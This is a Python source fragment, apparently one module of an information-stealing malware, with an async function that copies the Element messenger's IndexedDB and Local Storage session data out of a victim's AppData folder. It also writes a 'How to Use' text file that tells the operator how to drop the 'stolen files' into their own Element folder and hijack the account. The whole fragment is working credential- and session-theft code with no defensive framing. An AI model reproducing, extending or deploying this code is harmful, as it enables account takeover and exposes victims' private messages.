import os
from pathlib import Path
import shutil


async def StealElement(self, directory_path: str) -> None:
    try:
        found_element = False
        element_path = os.path.join(self.appdata, 'Element')
        copied_path = os.path.join(directory_path, "Messenger", "Element")
        if os.path.isdir(element_path):
            if not os.path.exists(copied_path):
                os.mkdir(copied_path)
            indexed_db_src = Path(element_path) / "IndexedDB"
            local_storage_src = Path(element_path) / "Local Storage"
            try:
                if os.path.exists(indexed_db_src):
                    shutil.copytree(indexed_db_src, os.path.join(copied_path, "IndexedDB"))
                if os.path.exists(local_storage_src):
                    shutil.copytree(local_storage_src, os.path.join(copied_path, "Local Storage"))
                found_element = True
            except Exception as e:
                print(f"copy element files error - {str(e)}")
                pass
            if found_element:
                os.mkdir(os.path.join(copied_path, "How to Use"))
                with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                    write_file.write("First, open this file path on your computer <%appdata%\\Element>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Element")
            if len(os.listdir(copied_path)) == 0:
                os.rmdir(copied_path)
    except Exception as e:
        print(f"element error - {str(e)}")
        pass 